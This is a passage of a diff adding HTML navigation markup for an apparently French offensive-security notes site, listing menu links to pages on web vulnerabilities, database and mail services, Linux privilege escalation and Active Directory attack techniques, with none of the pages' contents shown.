+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_2_3_10_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_3_10">
+            <span class="md-nav__icon md-icon"></span>
+            Joomla
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/Joomla/Bruteforce%20panel%20administration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bruteforce panel administration
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/Joomla/Enum%C3%A9ration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Enumération
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_3_11" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_3_11" id="__nav_6_2_3_11_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    LFI
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_2_3_11_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_3_11">
+            <span class="md-nav__icon md-icon"></span>
+            LFI
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/LFI/G%C3%A9n%C3%A9ralit%C3%A9s/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Généralités
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/LFI/Payloads/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Payloads
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_3_12" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_3_12" id="__nav_6_2_3_12_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    RFI
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_2_3_12_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_3_12">
+            <span class="md-nav__icon md-icon"></span>
+            RFI
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/RFI/G%C3%A9n%C3%A9ralit%C3%A9s/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Généralités
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_3_13" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_3_13" id="__nav_6_2_3_13_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    SQL injection
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_2_3_13_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_3_13">
+            <span class="md-nav__icon md-icon"></span>
+            SQL injection
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/SQL%20injection/G%C3%A9n%C3%A9ralit%C3%A9s/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Généralités
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_3_14" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_3_14" id="__nav_6_2_3_14_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    SSTI
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_2_3_14_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_3_14">
+            <span class="md-nav__icon md-icon"></span>
+            SSTI
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/SSTI/G%C3%A9n%C3%A9ralit%C3%A9s/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Généralités
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/SSTI/Payloads/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Payloads
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_3_15" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_3_15" id="__nav_6_2_3_15_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Tomcat
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_2_3_15_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_3_15">
+            <span class="md-nav__icon md-icon"></span>
+            Tomcat
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/Tomcat/Bruteforce%20Manager/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bruteforce Manager
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_3_16" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_3_16" id="__nav_6_2_3_16_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Werkzeug
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_2_3_16_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_3_16">
+            <span class="md-nav__icon md-icon"></span>
+            Werkzeug
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/Werkzeug/Console%20de%20debug/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Console de debug
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_3_17" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_3_17" id="__nav_6_2_3_17_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Wordpress
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_2_3_17_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_3_17">
+            <span class="md-nav__icon md-icon"></span>
+            Wordpress
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/Wordpress/WPscan/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    WPscan
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_3_18" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_3_18" id="__nav_6_2_3_18_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    XSS
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_2_3_18_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_3_18">
+            <span class="md-nav__icon md-icon"></span>
+            XSS
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/XSS/G%C3%A9n%C3%A9ralit%C3%A9s/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Généralités
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/XSS/Payloads/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Payloads
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_3_19" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_3_19" id="__nav_6_2_3_19_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    XXE
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_2_3_19_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_3_19">
+            <span class="md-nav__icon md-icon"></span>
+            XXE
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/HTTP/XXE/G%C3%A9n%C3%A9ralit%C3%A9s/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Généralités
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_4" id="__nav_6_2_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    MSSQL
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            MSSQL
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/MSSQL/G%C3%A9n%C3%A9ralit%C3%A9s/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Généralités
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/MSSQL/Relais%20NTLM/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Relais NTLM
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_5" id="__nav_6_2_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    MySQL
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_2_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_5">
+            <span class="md-nav__icon md-icon"></span>
+            MySQL
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/MySQL/G%C3%A9n%C3%A9ralit%C3%A9s/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Généralités
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_6" id="__nav_6_2_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    NFS
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_2_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_6">
+            <span class="md-nav__icon md-icon"></span>
+            NFS
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/NFS/G%C3%A9n%C3%A9ralit%C3%A9s/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Généralités
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/NFS/nfs-no-root-squashfs/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Nfs no root squashfs
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_7" id="__nav_6_2_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    POP3 IMAP
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_2_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_7">
+            <span class="md-nav__icon md-icon"></span>
+            POP3 IMAP
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/POP3%20IMAP/G%C3%A9n%C3%A9ralit%C3%A9s/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Généralités
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_8" id="__nav_6_2_8_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    SMTP
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_2_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_8">
+            <span class="md-nav__icon md-icon"></span>
+            SMTP
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/SMTP/G%C3%A9n%C3%A9ralit%C3%A9s/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Généralités
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_2_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_2_9" id="__nav_6_2_9_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    SNMP
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_2_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_2_9">
+            <span class="md-nav__icon md-icon"></span>
+            SNMP
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/2%20-%20Services/SNMP/G%C3%A9n%C3%A9ralit%C3%A9s/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Généralités
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_3" id="__nav_6_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    3   Linux
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_3">
+            <span class="md-nav__icon md-icon"></span>
+            3   Linux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/3%20-%20Linux/Enum%C3%A9ration/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Enumération
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_3_2" id="__nav_6_3_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Privesc
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Privesc
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/3%20-%20Linux/Privesc/Groupe%20LXC%20LXD/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Groupe LXC LXD
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/3%20-%20Linux/Privesc/Shared%20Object/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Shared Object
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_3_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_3_2_3" id="__nav_6_3_2_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Exploits
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_3_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_3_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Exploits
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/3%20-%20Linux/Privesc/Exploits/Playbook%20Ansible/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Playbook Ansible
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/3%20-%20Linux/Privesc/Exploits/Script%20Bash/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Script Bash
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/3%20-%20Linux/Privesc/Exploits/YAML%20deserialization/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    YAML deserialization
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_3_2_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_3_2_4" id="__nav_6_3_2_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Sudo
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_6_3_2_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_3_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            Sudo
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/3%20-%20Linux/Privesc/Sudo/GTFObins/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    GTFObins
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/3%20-%20Linux/Privesc/Sudo/ld_preload/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Ld preload
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_4" id="__nav_6_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    4   Windows
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_6_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_4">
+            <span class="md-nav__icon md-icon"></span>
+            4   Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Enum%C3%A9ration%20locale/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Enumération locale
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Shell%20depuis%20linux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Shell depuis linux
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_4_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_4_3" id="__nav_6_4_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Active Directory
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_6_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            Active Directory
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Active%20Directory/ADIDNS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    ADIDNS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Active%20Directory/AsrepRoasting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    AsrepRoasting
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Active%20Directory/Kerberoasting/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Kerberoasting
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Active%20Directory/LAPS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    LAPS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Red%20Team/4%20-%20Windows/Active%20Directory/Password%20et%20hash%20spraying/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Password et hash spraying
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6_4_3_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6_4_3_6" id="__nav_6_4_3_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    ACE ACL DACL
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
